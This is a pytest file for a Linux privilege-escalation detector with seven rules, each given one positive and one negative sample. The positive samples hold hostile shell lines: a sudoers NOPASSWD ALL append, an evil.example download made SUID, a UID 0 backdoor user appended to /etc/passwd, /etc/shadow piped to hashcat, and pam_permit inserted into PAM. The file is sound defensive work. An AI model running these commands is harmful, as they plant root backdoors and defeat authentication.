"""Tests for scripts/lib/linux_privesc_patterns.py.

Pattern-coverage tests for the Wave-25 distill-round-11 Linux
USER-SPACE privesc catalogue (7 rules covering sudoers
``NOPASSWD: ALL``, SUID bit on attacker-dropped binary, polkit
permissive rule, Yama ptrace_scope reset, ``setcap`` of lesser
lethal caps on user binaries, ``/etc/shadow`` read /
``/etc/passwd`` write, PAM ``pam_permit.so`` / ``nullok``
loosening).

Each rule has exactly 2 tests (one positive, one negative/carve-out)
plus a small block of data-model sanity tests.
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import linux_privesc_patterns as lpp  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_contains_every_advertised_rule() -> None:
    """RULES must cover all 7 documented rule IDs."""
    assert isinstance(lpp.RULES, tuple)
    rule_ids = {r.id for r in lpp.RULES}
    expected = {
        "linux-privesc-sudoers-nopasswd-all",
        "linux-privesc-suid-bit-on-dropped-binary",
        "linux-privesc-polkit-permissive-rule",
        "linux-privesc-yama-ptrace-scope-reset",
        "linux-privesc-setcap-userspace-dangerous-cap",
        "linux-privesc-shadow-read-or-passwd-write",
        "linux-privesc-pam-permit-or-nullok",
    }
    assert expected == rule_ids
    assert len(lpp.RULES) == 7


def test_every_rule_has_valid_owasp_and_severity() -> None:
    """Every rule maps to a valid ASI- prefix and a known severity."""
    for rule in lpp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id
        assert rule.description.strip(), rule.id
        assert rule.name.strip(), rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding mirrors webhook_signature_patterns.Finding shape."""
    f = lpp.Finding(
        rule_id="r",
        line=1,
        column=2,
        matched_text="m",
        severity="CRITICAL",
        description="d",
        owasp_asi="ASI-03",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "CRITICAL"
    assert f.description == "d"
    assert f.owasp_asi == "ASI-03"


def test_empty_text_returns_empty_findings() -> None:
    """Empty input must short-circuit to []."""
    assert lpp.scan_text("") == []


def _hits(rule_id: str, text: str) -> list[lpp.Finding]:
    return [f for f in lpp.scan_text(text) if f.rule_id == rule_id]


# ---------- L1 : linux-privesc-sudoers-nopasswd-all ----------------------


def test_l1_sudoers_nopasswd_all_line_flags() -> None:
    """Shai-Hulud-style sudoers NOPASSWD: ALL line → CRITICAL hit."""
    src = (
        "echo 'runner ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers\n"
        "echo '%wheel ALL=(ALL:ALL) NOPASSWD:ALL' "
        "| sudo tee -a /etc/sudoers.d/0-attacker\n"
    )
    hits = _hits("linux-privesc-sudoers-nopasswd-all", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_l1_sudoers_rootok_line_not_flagged() -> None:
    """Normal sudo PAM rootok line (NOT NOPASSWD:ALL) → no hit."""
    src = (
        "# This is the canonical sudoers rule shape — no NOPASSWD\n"
        "root ALL=(ALL:ALL) ALL\n"
        "%admin ALL=(ALL) ALL\n"
    )
    assert not _hits("linux-privesc-sudoers-nopasswd-all", src)


# ---------- L2 : linux-privesc-suid-bit-on-dropped-binary ----------------


def test_l2_suid_bit_on_dropped_path_flags() -> None:
    """chmod 4755 on /tmp dropper → HIGH hit."""
    src = (
        "curl -fsSL https://evil.example/payload -o /tmp/.x/sploit\n"
        "chmod 4755 /tmp/.x/sploit\n"
        "chmod u+s /opt/agent/runner.sh\n"
    )
    hits = _hits("linux-privesc-suid-bit-on-dropped-binary", src)
    assert hits
    assert hits[0].severity == "HIGH"


def test_l2_chmod_on_canonical_suid_path_not_flagged() -> None:
    """chmod 4755 /usr/bin/passwd in a distro packaging script → no hit."""
    src = (
        "# Reapply SUID bit on canonical system binary post-install\n"
        "chmod 4755 /usr/bin/passwd\n"
        "chmod 4755 /usr/bin/su\n"
        "chmod 4755 /usr/bin/sudo\n"
    )
    assert not _hits("linux-privesc-suid-bit-on-dropped-binary", src)


# ---------- L3 : linux-privesc-polkit-permissive-rule --------------------


def test_l3_polkit_world_writable_chmod_flags() -> None:
    """chmod 666 /etc/polkit-1/rules.d/*.rules → CRITICAL hit."""
    src = (
        "# Attacker drops a permissive polkit rule and unlocks the file\n"
        "chmod 666 /etc/polkit-1/rules.d/50-default.rules\n"
        "chmod o+w /usr/share/polkit-1/rules.d/org.freedesktop.policykit.rules\n"
    )
    hits = _hits("linux-privesc-polkit-permissive-rule", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_l3_polkit_distro_safe_chmod_not_flagged() -> None:
    """chmod 0644 /etc/polkit-1/rules.d/* (the distro-safe mode) → no hit."""
    src = (
        "install -m 0644 ./49-systemd.rules /etc/polkit-1/rules.d/\n"
        "chmod 0644 /etc/polkit-1/rules.d/50-default.rules\n"
    )
    assert not _hits("linux-privesc-polkit-permissive-rule", src)


# ---------- L4 : linux-privesc-yama-ptrace-scope-reset -------------------


def test_l4_ptrace_scope_reset_flags() -> None:
    """sysctl -w kernel.yama.ptrace_scope=0 → HIGH hit."""
    src = (
        "sysctl -w kernel.yama.ptrace_scope=0\n"
        "echo 0 > /proc/sys/kernel/yama/ptrace_scope\n"
        "prctl(PR_SET_PTRACER, PR_SET_PTRACER_ANY);\n"
    )
    hits = _hits("linux-privesc-yama-ptrace-scope-reset", src)
    assert hits
    assert hits[0].severity == "HIGH"


def test_l4_ptrace_scope_safe_value_not_flagged() -> None:
    """ptrace_scope = 1 (restricted) and =3 (no-attach) → no hit."""
    src = (
        "kernel.yama.ptrace_scope = 1\n"
        "sysctl -w kernel.yama.ptrace_scope=3\n"
        "# Documentation reference: PR_SET_PTRACER (no ANY)\n"
    )
    assert not _hits("linux-privesc-yama-ptrace-scope-reset", src)


# ---------- L5 : linux-privesc-setcap-userspace-dangerous-cap ------------


def test_l5_setcap_dac_override_on_user_binary_flags() -> None:
    """setcap cap_dac_override+ep on /opt/* → HIGH hit."""
    src = (
        "setcap cap_net_raw,cap_dac_override+ep /usr/local/bin/agent\n"
        "setcap cap_setuid+ep /opt/myapp/helper\n"
        "setcap 'cap_setuid+eip' ./dropped_tool\n"
    )
    hits = _hits("linux-privesc-setcap-userspace-dangerous-cap", src)
    assert hits
    assert hits[0].severity == "HIGH"


def test_l5_setcap_on_canonical_path_not_flagged() -> None:
    """setcap cap_net_raw+ep /usr/bin/ping (textbook correct use) → no hit."""
    src = (
        "setcap cap_net_raw+ep /usr/bin/ping\n"
        "setcap cap_net_raw+ep /usr/sbin/tcpdump\n"
        "setcap cap_net_raw+ep /usr/bin/mtr-packet\n"
    )
    assert not _hits("linux-privesc-setcap-userspace-dangerous-cap", src)


# ---------- L6 : linux-privesc-shadow-read-or-passwd-write --------------


def test_l6_passwd_write_uid_zero_user_flags() -> None:
    """Append a UID 0 user to /etc/passwd → CRITICAL hit."""
    src = (
        "echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd\n"
        "cat /etc/shadow | hashcat -m 1800 - rockyou.txt\n"
    )
    hits = _hits("linux-privesc-shadow-read-or-passwd-write", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_l6_passwd_read_only_not_flagged() -> None:
    """Plain read of /etc/passwd (world-readable by design) → no hit."""
    src = (
        "# /etc/passwd is world-readable — reads are normal\n"
        "cat /etc/passwd | awk -F: '{print $1}'\n"
        "getent passwd | grep '^root:'\n"
    )
    assert not _hits("linux-privesc-shadow-read-or-passwd-write", src)


# ---------- L7 : linux-privesc-pam-permit-or-nullok ----------------------


def test_l7_pam_permit_in_sudo_stack_flags() -> None:
    """auth sufficient pam_permit.so in /etc/pam.d/sudo → CRITICAL hit."""
    src = (
        "echo 'auth sufficient pam_permit.so' > /etc/pam.d/sudo\n"
        "sed -i '1i auth sufficient pam_permit.so' /etc/pam.d/su\n"
    )
    hits = _hits("linux-privesc-pam-permit-or-nullok", src)
    assert hits
    assert hits[0].severity == "CRITICAL"


def test_l7_pam_rootok_not_flagged() -> None:
    """auth sufficient pam_rootok.so (canonical sudo) → no hit."""
    src = (
        "# /etc/pam.d/sudo — distro default\n"
        "auth       sufficient pam_rootok.so\n"
        "@include common-auth\n"
        "@include common-account\n"
    )
    assert not _hits("linux-privesc-pam-permit-or-nullok", src)
